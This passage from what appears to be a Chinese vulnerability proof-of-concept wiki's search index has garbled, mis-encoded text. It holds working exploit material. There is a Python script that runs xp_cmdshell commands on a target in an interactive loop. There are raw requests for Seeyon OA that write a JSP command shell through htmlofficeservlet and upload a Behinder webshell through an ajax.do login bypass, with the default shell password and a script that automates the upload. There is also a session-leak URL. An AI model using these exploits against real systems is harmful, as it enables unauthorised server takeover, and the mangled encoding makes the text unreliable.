xp_cmdshell' in response.text: print(\"\\033[31m[x] æ•°æ®åº“æœªå¼€å¯ xp_cmdshell æ¨¡å—\\033[0m\") sqlcmd_open = str(input(\"\\033[35mæ˜¯å¦å¼€å¯ xp_cmdshell\\n(Y/N) >>> \\033[0m\")) if sqlcmd_open == 'Y' or sqlcmd_open == 'y': xp_cmdshell_open(target_url, db_name) else: print(\"\\033[31m[x] åœæ­¢å¼€å¯ xp_cmdshell \\033[0m\") sys.exit(0) else: whoami = re.findall(r'output=\"(.*?)\"', response.text)[0] print(\"\\033[32m[o] æˆåŠŸæ‰§è¡ŒSQLè¯­å¥:exec xp_cmdshell 'whoami'...\\n>>> {}\\033[0m\".format(whoami)) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥:{} \\033[0m\".format(e)) sys.exit(0) def POC_3(target_url, cmd): vuln_url = target_url + \"/Proxy\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDataexec xp_cmdshell \"{}\"'.format(cmd) try: print(\"\\033[32m[o] æ­£åœ¨æ‰§è¡ŒSQLè¯­å¥:exec xp_cmdshell '{}'...\\033[0m\".format(cmd)) response = requests.post(url=vuln_url, headers=headers, data=data, timeout=10) data = re.findall(r'output=\"(.*?)\"', response.text) for i in data: print(\"\\033[32m >>> {}\\033[0m\".format(i)) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) db_name = POC_1(target_url) POC_2(target_url, db_name) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_3(target_url, cmd) WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/è‡´è¿œOA/":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/è‡´è¿œOA/","title":"è‡´è¿œOA","keywords":"","body":"è‡´è¿œOA è‡´è¿œOA A8 htmlofficeservlet RCEæ¼æ´ è‡´è¿œOA Sessionæ³„æ¼æ¼æ´ è‡´è¿œOA ajax.doç™»å½•ç»•è¿‡ ä»»æ„æ–‡ä»¶ä¸Šä¼  CNVD-2021-01627 WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/è‡´è¿œOA/è‡´è¿œOA A8 htmlofficeservlet RCEæ¼æ´.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/è‡´è¿œOA/è‡´è¿œOA A8 htmlofficeservlet RCEæ¼æ´.html","title":"è‡´è¿œ OA A8 htmlofficeservlet RCEæ¼æ´","keywords":"","body":"è‡´è¿œ OA A8 htmlofficeservlet RCEæ¼æ´ CNVD-2019-19299 æ¼æ´æè¿° è¯¥æ¼æ´æœ€æ—©äº6æœˆ26å·å·¦å³ï¼Œæœ‰å®‰å…¨å‚å•†å‘å‡ºæ¼æ´é¢„è­¦ã€‚ è¿œç¨‹æ”»å‡»è€…åœ¨æ— éœ€ç™»å½•çš„æƒ…å†µä¸‹å¯é€šè¿‡å‘ URL /seeyon/htmlofficeservlet POST ç²¾å¿ƒæ„é€ çš„æ•°æ®å³å¯å‘ç›®æ ‡æœåŠ¡å™¨å†™å…¥ä»»æ„æ–‡ä»¶ï¼Œå†™å…¥æˆåŠŸåå¯æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤è¿›è€Œæ§åˆ¶ç›®æ ‡æœåŠ¡å™¨ã€‚ FOFA [!NOTE] title=\"è‡´è¿œA8-V5ååŒç®¡ç†è½¯ä»¶ V6.1sp1\" å½±å“ç‰ˆæœ¬ [!NOTE] è‡´è¿œA8-V5ååŒç®¡ç†è½¯ä»¶V6.1sp1 è‡´è¿œA8+ååŒç®¡ç†è½¯ä»¶V7.0ã€V7.0sp1ã€V7.0sp2ã€V7.0sp3 è‡´è¿œA8+ååŒç®¡ç†è½¯ä»¶V7.1 æ¼æ´å¤ç° è®¿é—®ç›®æ ‡ç«™ç‚¹ http://xxx.xxx.xxx.xxx:8088/seeyon/htmlofficeservlet å‡ºç°å¦‚ä¸‹å›¾å“åº”ï¼Œåˆ™å¯èƒ½å«æœ‰æ¼æ´ ä½¿ç”¨POSTè¯·æ±‚å‘å‡ºå¦‚ä¸‹è¯·æ±‚åŒ… DBSTEP V3.0 355 0 666 DBSTEP=OKMLlKlV OPTION=S3WYOSWLBSGr currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66 CREATEDATE=wUghPB3szB3Xwg66 RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6 originalFileId=wV66 originalCreateDate=wUghPB3szB3Xwg66 FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6 needReadFile=yRWZdAS6 originalCreateDate=wLSGP4oEzLKAz4=iz=66 \"+excuteCmd(request.getParameter(\"cmd\")) + \"\");}else{out.println(\":-)\");}%>>a6e4f045d4b8506bf492ada7e3390d7ce å‡ºç°å¦‚å›¾å“åº”åˆ™ä¸ºä¸Šä¼ æˆåŠŸ è®¿é—® http://xxx.xxx.xxx.xxx:8088/seeyon/testtesta.jsp?pwd=calsee&cmd=cmd+/c+dir æ¼æ´åˆ©ç”¨POC Gobyä¸­å«æœ‰æ¼æ´æ£€æµ‹POC WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/è‡´è¿œOA/è‡´è¿œOA Sessionæ³„æ¼æ¼æ´.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/è‡´è¿œOA/è‡´è¿œOA Sessionæ³„æ¼æ¼æ´.html","title":"è‡´è¿œOA Sessionæ³„æ¼æ¼æ´","keywords":"","body":"è‡´è¿œOA Sessionæ³„æ¼æ¼æ´ æ¼æ´æè¿° é€šè¿‡ä½¿ç”¨å­˜åœ¨æ¼æ´çš„è¯·æ±‚æ—¶ï¼Œä¼šå›æ˜¾éƒ¨åˆ†ç”¨æˆ·çš„Sessionå€¼ï¼Œå¯¼è‡´å‡ºç°ä»»æ„ç™»å½•çš„æƒ…å†µ å½±å“ç‰ˆæœ¬ [!NOTE] æœªçŸ¥ æ¼æ´å¤ç° è¯·æ±‚ http://xxx.xxx.xxx.xxx/yyoa/ext/https/getSessionList.jsp?cmd=getAll å›æ˜¾Sessionåˆ™å­˜åœ¨æ¼æ´ å‚è€ƒæ–‡ç«  é›¶ç»„æ–‡åº“ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/è‡´è¿œOA/è‡´è¿œOA ajax.doç™»å½•ç»•è¿‡ ä»»æ„æ–‡ä»¶ä¸Šä¼ .html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/è‡´è¿œOA/è‡´è¿œOA ajax.doç™»å½•ç»•è¿‡ ä»»æ„æ–‡ä»¶ä¸Šä¼ .html","title":"è‡´è¿œOA ajax.doç™»å½•ç»•è¿‡ ä»»æ„æ–‡ä»¶ä¸Šä¼ ","keywords":"","body":"è‡´è¿œOA ajax.doç™»å½•ç»•è¿‡ ä»»æ„æ–‡ä»¶ä¸Šä¼  CNVD-2021-01627 æ¼æ´æè¿° è‡´è¿œOAæ˜¯ä¸€å¥—åŠå…¬ååŒç®¡ç†è½¯ä»¶ã€‚è¿‘æ—¥ï¼Œå¥‡å®‰ä¿¡CERTç›‘æµ‹åˆ°è‡´è¿œOAçš„ç›¸å…³æ¼æ´ä¿¡æ¯ã€‚ç”±äºè‡´è¿œOAæ—§ç‰ˆæœ¬æŸäº›æ¥å£å­˜åœ¨æœªæˆæƒè®¿é—®ï¼Œä»¥åŠéƒ¨åˆ†å‡½æ•°å­˜åœ¨è¿‡æ»¤ä¸è¶³ï¼Œæ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„è¯·æ±‚ï¼Œå¯åœ¨æ— éœ€ç™»å½•çš„æƒ…å†µä¸‹ä¸Šä¼ æ¶æ„è„šæœ¬æ–‡ä»¶ï¼Œä»è€Œæ§åˆ¶æœåŠ¡å™¨ã€‚è‡´è¿œOAå®˜æ–¹å·²é’ˆå¯¹è¯¥æ¼æ´æä¾›è¡¥ä¸ã€‚é‰´äºæ¼æ´å±å®³è¾ƒå¤§ï¼Œå»ºè®®ç”¨æˆ·å°½å¿«åº”ç”¨è¡¥ä¸æ›´æ–°ã€‚ æ¼æ´å½±å“ [!NOTE] è‡´è¿œOA V8.0 è‡´è¿œOA V7.1ã€V7.1SP1 è‡´è¿œOA V7.0ã€V7.0SP1ã€V7.0SP2ã€V7.0SP3 è‡´è¿œOA V6.0ã€V6.1SP1ã€V6.1SP2 è‡´è¿œOA V5.x è‡´è¿œOA G6 æ¼æ´å¤ç° é€šè¿‡è¯·æ±‚åˆ¤æ–­æ˜¯å¦å¯èƒ½å­˜åœ¨æ¼æ´ http://xxx.xxx.xxx.xxx/seeyon/thirdpartyController.do.css/..;/ajax.do æŸ¥çœ‹æ˜¯å¦å‡ºç°å¦‚ä¸Šå›¾å¼‚å¸¸ï¼Œè‹¥å­˜åœ¨åˆ™å¯èƒ½å‡ºç°æ¼æ´ å‡ºç°å¼‚å¸¸ï¼šjava.lang.NullPointerException:null ç„¶åè°ƒç”¨æœªæˆæƒçš„æ–‡ä»¶ä¸Šä¼ æ¥å£ä¸Šä¼ webshellæ–‡ä»¶ POCè¯·æ±‚åŒ…å¦‚ä¸‹ POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip HTTP/1.1 Host: 127.0.0.1 Connection: close Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 loginPageURL=; login_locale=zh_CN; Content-Type: application/x-www-form-urlencoded managerMethod=validate&arguments=%1F%C2%8B%08%00%00%00%00%00%00%0AuTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28%2A%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%C2%9D%C2%9D%C2%87%C3%B6%C2%A8%1F%C2%A6I%C3%99y%C3%B8%09%C3%8B%C3%9C%5DH%03%0F%C3%A3%C3%9A%C2%87%C2%9D%C2%98%C3%9C%C3%80%2C%C2%A9%5Cn%C3%8CJ%C3%8B+sE%C3%A1%C2%B6%25%C2%B5%C2%8CE%C3%8ERe%C3%81%2C.%C3%96%5C%12%402%C3%8F%01%C2%AF%C3%A7k%C2%A2%14%C2%AE6%C2%96%C2%8F%C2%83%C2%97%C3%A2%28.%22%5B%C2%93%7CH%C3%B4%0Ap%C2%B8pC%16m%C2%B4a%25%C2%85%C3%83g%27R%C2%AE%5B%C2%A2%26%C2%80%C3%A8%21%141gk%C3%82%C3%952+%C2%96D%C2%9C%01q%5C%C3%81%1A%C2%9F%2C8K%13%06%C3%B4%3D%5D%C2%A38mx%C3%93%C3%8F-%7E%25%C2%80%C2%A5Z%7C%2A%C2%A3%C2%B8%C2%B6%C2%B1%C3%89e%24%15%C2%BB%C2%B0%C3%BC%07%C3%B0%2F%C3%9FlQ%0F%5DqQY%C2%A6%C2%9A%C2%B8%C3%9C%C3%B0Q%12%C2%95%C3%942%C2%95%C2%9B%C2%B48%C3%BA%C2%B6%19%C2%B0%C2%B6%21%C2%9CA5%C2%99Q%C2%9D%1B%60%C3%8B%C3%822T%0C%C2%A2L%C2%97%C3%A7%C2%AD%C3%9EA%1C%07%14%C2%A3%C2%92%C3%84M%C3%A2%C3%B1%C3%8A%00PZ%C2%A6%C3%B4%C2%96%1F%5C%C2%A1%C2%B1J%1Dc%C3%A3%C3%AF%C2%B92%00%C3%BC%C3%86%C2%B7%C2%AB%00y%C2%A6%C2%8A%C2%A5E%06-%C2%84G4%3E%16%C2%9A%C2%AB%5CZ%C2%B6vk%C2%A2b%C2%9B%C3%A0%C3%9C%3E%C2%B6%C3%98%C2%B2%28%C2%A5%C2%9Bi%C2%89%C3%96%C2%A4%C3%84.%C2%81%C2%AC3%3D%C2%8FN%26%C3%BBLsZ%C3%A7%C3%BDl%1B%C2%B5%C3%9E%2A%C2%A09%C2%A0%C3%B9%C2%BB%C3%A7-RB%40%C3%B0%15%C2%8A%25%C2%863%C3%A1%00%C2%97%C2%AB%C3%84%25%C3%80wn%2C%C2%B2%0F%C3%BB%C2%81%7D%C3%98T%5B%C3%83%C3%86V%C2%A8%C2%9F%C2%B7%07i%60%21i%048%C3%BD%C3%96%C3%94%00%09Wh%C2%AA%C2%86e%C2%94%03%5B%C3%B3%11%C3%94%C2%A4%C3%94%C2%A9%C3%8E%C2%A3%3D%C2%87%C2%AFN%1B%C3%A3%C3%B8%C2%8D%5E%13%C2%88%C3%A1%1C%C3%93%C2%BA%C2%AA%C2%81K%14%2COW%13U%C3%9F+%C3%B9%C2%90%C2%85k%1A%C2%83c%C3%AE%C3%A3%0D%2As%C3%9B%04%C3%BE%C2%91%C3%93%C3%83%3AV%C2%8D%C3%93%C2%85%23%3F%C3%81V%C3%A5%C3%87%1F%C3%BE%C2%8C%C3%AC_%C3%BFL%C3%A4JB%C2%B2%C3%96%C3%88%C2%A7u%C2%BE%40%C3%A5%27%C3%AB7%7C%C3%AD%3Cr%C2%89%C3%8E%C3%93%C3%BA%C3%84P%0C%12P5zm%7Dj%C2%BD%C3%86%C2%AF_k%23O%C3%8FT%0Eb%C2%AB%12%C3%8E.k%C3%93%7C%2CRY%140%C2%AC%267h%0Cs%C3%97%C3%807%C3%BA6%C3%9D%C3%AB%C3%8AB%09%C3%959%C3%8Dkq%C2%B7%C3%8B%C2%9B%C3%BE%C3%A0T%C2%BC%C2%8Ftb%C3%93%5E%C2%95%C2%97%2B%0CL%1D%03%7E%C2%9F%C3%9B%C2%9C%C3%8E%1E%C2%89%C3%BE%C3%B6G%0Ej%C2%9AN%C2%ADK%C2%8E1%C3%B53%C2%A11%C3%90%C3%B8%C3%A1%C3%8A%C2%8D%14%C3%962%C2%84%C2%90%C3%86G%C3%BD%C3%90Kh%2CRP%05MO%C3%AF%C2%B9q%0EE%7D%08imw%C3%93q%C3%93%C2%93%C2%80S%2A%C3%87%C2%9C%C2%B0%C2%AE%C2%A8%C2%B3%C2%BB%C3%B0Z%C2%B4u%5D%15.%C2%BF%7F%7C%C2%9Fr%26%C3%8D%C2%A3%3EA%29%C3%A8O%5E%C2%B4%C3%B9%C2%B7%C3%A1%C3%8C%031%C2%A4%C2%83%0E%C3%AFw%3B%C3%A3%C2%9F%2B%C3%B5%C3%BE%3B%C3%95%C2%AD%C3%99%C2%9Dim%5B%C2%A6w%07%C3%AC%C2%B7%C3%B7%24%3F%C2%9D%28%40%C2%B3%04%1E%C2%BEt%C2%8E%C2%87%C3%85%C3%97%C3%A7%C2%8FK%C3%A2%C3%A3%C2%9E%C3%A97%0C%C2%8Ez%1F%C3%81%C3%BFO%17%C3%A08%C3%B5%C2%A8c%3F%C2%BE%C3%97%7B%C2%90%12%C3%90%3B1i%C3%A6d%080eY%C3%B6%1E%5E%C2%BB%3F%C3%A8r%C2%A4%0B%C3%B2%C2%B5%C2%BE%C2%B3K%C3%AEu%C3%BF%C3%BE%17%1CR%C2%AD%17W%05%00%00 å†°è3 é»˜è®¤é©¬pass : rebeyond webshellåœ°å€: http://xxx.xxx.xxx.xxx/seeyon/PeiQi.jspx æˆåŠŸä¼šè¿”å› { \"message\":null, \"details\":null, \"code\":\"0436821967\" } å¤±è´¥ä¼šè¿”å› { \"message\": \"è¢«è¿«ä¸‹çº¿ï¼ŒåŸå› ï¼šä¸æœåŠ¡å™¨å¤±å»è¿æ¥\", \"code\": \"-1\", \"details\": null } ä¸Šä¼ åè¯·æ±‚webshellåœ°å€ï¼Œè®¿é—®è¿”å›å‡ºç°å¦‚ä¸‹å›¾åˆ™æˆåŠŸå†™å…¥ [!NOTE] è®¿é—®çŠ¶æ€ç ä¸º 200 æˆåŠŸ è®¿é—®çŠ¶æ€ç ä¸º 404 å¤±è´¥ ä½¿ç”¨å†°èè¿æ¥:rebeyond æ¼æ´åˆ©ç”¨POC import requests import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: è‡´è¿œOA å¤šä¸ªç‰ˆæœ¬ \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url_2 = target_url + \"/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip\" print('\\033[36m[o] æ­£åœ¨è¯·æ±‚: {}'.format(vuln_url_2)) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", } data = \"managerMethod=validate&arguments=%1F%C2%8B%08%00%00%00%00%00%00%0AuTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28%2A%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%C2%9D%C2%9D%C2%87%C3%B6%C2%A8%1F%C2%A6I%C3%99y%C3%B8%09%C3%8B%C3%9C%5DH%03%0F%C3%A3%C3%9A%C2%87%C2%9D%C2%98%C3%9C%C3%80%2C%C2%A9%5Cn%C3%8CJ%C3%8B+sE%C3%A1%C2%B6%25%C2%B5%C2%8CE%C3%8ERe%C3%81%2C.%C3%96%5C%12%402%C3%8F%01%C2%AF%C3%A7k%C2%A2%14%C2%AE6%C2%96%C2%8F%C2%83%C2%97%C3%A2%28.%22%5B%C2%93%7CH%C3%B4%0Ap%C2%B8pC%16m%C2%B4a%25%C2%85%C3%83g%27R%C2%AE%5B%C2%A2%26%C2%80%C3%A8%21%141gk%C3%82%C3%952+%C2%96D%C2%9C%01q%5C%C3%81%1A%C2%9F%2C8K%13%06%C3%B4%3D%5D%C2%A38mx%C3%93%C3%8F-%7E%25%C2%80%C2%A5Z%7C%2A%C2%A3%C2%B8%C2%B6%C2%B1%C3%89e%24%15%C2%BB%C2%B0%C3%BC%07%C3%B0%2F%C3%9FlQ%0F%5DqQY%C2%A6%C2%9A%C2%B8%C3%9C%C3%B0Q%12%C2%95%C3%942%C2%95%C2%9B%C2%B48%C3%BA%C2%B6%19%C2%B0%C2%B6%21%C2%9CA5%C2%99Q%C2%9D%1B%60%C3%8B%C3%822T%0C%C2%A2L%C2%97%C3%A7%C2%AD%C3%9EA%1C%07%14%C2%A3%C2%92%C3%84M%C3%A2%C3%B1%C3%8A%00PZ%C2%A6%C3%B4%C2%96%1F%5C%C2%A1%C2%B1J%1Dc%C3%A3%C3%AF%C2%B92%00%C3%BC%C3%86%C2%B7%C2%AB%00y%C2%A6%C2%8A%C2%A5E%06-%C2%84G4%3E%16%C2%9A%C2%AB%5CZ%C2%B6vk%C2%A2b%C2%9B%C3%A0%C3%9C%3E%C2%B6%C3%98%C2%B2%28%C2%A5%C2%9Bi%C2%89%C3%96%C2%A4%C3%84.%C2%81%C2%AC3%3D%C2%8FN%26%C3%BBLsZ%C3%A7%C3%BDl%1B%C2%B5%C3%9E%2A%C2%A09%C2%A0%C3%B9%C2%BB%C3%A7-RB%40%C3%B0%15%C2%8A%25%C2%863%C3%A1%00%C2%97%C2%AB%C3%84%25%C3%80wn%2C%C2%B2%0F%C3%BB%C2%81%7D%C3%98T%5B%C3%83%C3%86V%C2%A8%C2%9F%C2%B7%07i%60%21i%048%C3%BD%C3%96%C3%94%00%09Wh%C2%AA%C2%86e%C2%94%03%5B%C3%B3%11%C3%94%C2%A4%C3%94%C2%A9%C3%8E%C2%A3%3D%C2%87%C2%AFN%1B%C3%A3%C3%B8%C2%8D%5E%13%C2%88%C3%A1%1C%C3%93%C2%BA%C2%AA%C2%81K%14%2COW%13U%C3%9F+%C3%B9%C2%90%C2%85k%1A%C2%83c%C3%AE%C3%A3%0D%2As%C3%9B%04%C3%BE%C2%91%C3%93%C3%83%3AV%C2%8D%C3%93%C2%85%23%3F%C3%81V%C3%A5%C3%87%1F%C3%BE%C2%8C%C3%AC_%C3%BFL%C3%A4JB%C2%B2%C3%96%C3%88%C2%A7u%C2%BE%40%C3%A5%27%C3%AB7%7C%C3%AD%3Cr%C2%89%C3%8E%C3%93%C3%BA%C3%84P%0C%12P5zm%7Dj%C2%BD%C3%86%C2%AF_k%23O%C3%8FT%0Eb%C2%AB%12%C3%8E.k%C3%93%7C%2CRY%140%C2%AC%267h%0Cs%C3%97%C3%807%C3%BA6%C3%9D%C3%AB%C3%8AB%09%C3%959%C3%8Dkq%C2%B7%C3%8B%C2%9B%C3%BE%C3%A0T%C2%BC%C2%8Ftb%C3%93%5E%C2%95%C2%97%2B%0CL%1D%03%7E%C2%9F%C3%9B%C2%9C%C3%8E%1E%C2%89%C3%BE%C3%B6G%0Ej%C2%9AN%C2%ADK%C2%8E1%C3%B53%C2%A11%C3%90%C3%B8%C3%A1%C3%8A%C2%8D%14%C3%962%C2%84%C2%90%C3%86G%C3%BD%C3%90Kh%2CRP%05MO%C3%AF%C2%B9q%0EE%7D%08imw%C3%93q%C3%93%C2%93%C2%80S%2A%C3%87%C2%9C%C2%B0%C2%AE%C2%A8%C2%B3%C2%BB%C3%B0Z%C2%B4u%5D%15.%C2%BF%7F%7C%C2%9Fr%26%C3%8D%C2%A3%3EA%29%C3%A8O%5E%C2%B4%C3%B9%C2%B7%C3%A1%C3%8C%031%C2%A4%C2%83%0E%C3%AFw%3B%C3%A3%C2%9F%2B%C3%B5%C3%BE%3B%C3%95%C2%AD%C3%99%C2%9Dim%5B%C2%A6w%07%C3%AC%C2%B7%C3%B7%24%3F%C2%9D%28%40%C2%B3%04%1E%C2%BEt%C2%8E%C2%87%C3%85%C3%97%C3%A7%C2%8FK%C3%A2%C3%A3%C2%9E%C3%A97%0C%C2%8Ez%1F%C3%81%C3%BFO%17%C3%A08%C3%B5%C2%A8c%3F%C2%BE%C3%97%7B%C2%90%12%C3%90%3B1i%C3%A6d%080eY%C3%B6%1E%5E%C2%BB%3F%C3%A8r%C2%A4%0B%C3%B2%C2%B5%C2%BE%C2%B3K%C3%AEu%C3%BF%C3%BE%17%1CR%C2%AD%17W%05%00%00\" requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url_2, headers=headers, data=data, verify=False) test_webshell(target_url) def test_webshell(target_url): webshell_url = target_url + \"/seeyon/PeiQi.jspx\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=webshell_url, timeout=10, verify=False, headers=headers) print(\"\\033[32m[o] æ­£åœ¨è¯·æ±‚ : {}/seeyon/PeiQi.jspx\\033[0m\".format(target_url)) if response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {} æˆåŠŸä¸Šä¼  webshell : {}/seeyon/PeiQi.jspx\\033[0m\".format(target_url,target_url)) print(\"\\033[32m[o] webshellåœ°å€ï¼š{}/seeyon/PeiQi.jspx \\033[0m\".format(target_url)) print(\"\\033[32m[o] å†°è3é»˜è®¤é©¬ pass ï¼šrebeyond \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] ç›®æ ‡æ¼æ´æ— æ³•åˆ©ç”¨ï¼Œå†™å…¥å¤±è´¥ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ç›®æ ‡æ¼æ´æ— æ³•åˆ©ç”¨ï¼Œå†™å…¥å¤±è´¥ {} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) æ–‡ä»¶ç¼–ç è„šæœ¬, è‡ªè¡Œè¿›è¡Œè‡ªå®šä¹‰è°ƒè¯• WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/CMSæ¼æ´/":{"url":"PeiQi_Wiki/CMSæ¼æ´/","title":"CMSæ¼æ´","keywords":"","body":"CMS æ¼æ´ğŸ¦… WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/CMSæ¼æ´/æè‡´CMS/":{"url":"PeiQi_Wiki/CMSæ¼æ´/æè‡´CMS/","title":"æè‡´CMS","keywords":"","body":"æè‡´CMS æè‡´CMS å…¨ç‰ˆæœ¬ä»»æ„ä»£ç æ‰§è¡Œ(åå°æƒé™) æè‡´CMS 1.71 ,1.7 ,1.67 ç‰ˆæœ¬ æ”¯ä»˜æ’ä»¶sqlæ³¨å…¥ æè‡´CMS WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/CMSæ¼æ´/æè‡´CMS/æè‡´CMS_å…¨ç‰ˆæœ¬ä»»æ„æ–‡ä»¶ä¸Šä¼ .html":{"url":"PeiQi_Wiki/CMSæ¼æ´/æè‡´CMS/æè‡´CMS_å…¨ç‰ˆæœ¬ä»»æ„æ–‡ä»¶ä¸Šä¼ .html","title":"æè‡´CMS ä»»æ„æ–‡ä»¶ä¸Šä¼ (åå°æƒé™)","keywords":"","body":"æè‡´CMS_å…¨ç‰ˆæœ¬ä»»æ„æ–‡ä»¶(åå°) ç™»é™†åå°æŸ¥çœ‹æ’ä»¶å¤„ï¼Œæœ‰ä¸€ä¸ªåå°ç¼–è¾‘çš„æ’ä»¶ å®‰è£…ä¹‹åè®¾ç½®å¯†ç å¹¶ä½¿ç”¨ [!NOTE] å¦‚æœå·²ç»è®¾æœ‰å¯†ç ï¼Œé‡æ–°å®‰è£…æ’ä»¶å³å¯è§£å†³å¯†ç æœªçŸ¥é—®é¢˜ ä¿®æ”¹ä¸ºphpä»£ç  æˆåŠŸæ‰§è¡Œphpä»£ç çš„å‘½ä»¤ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 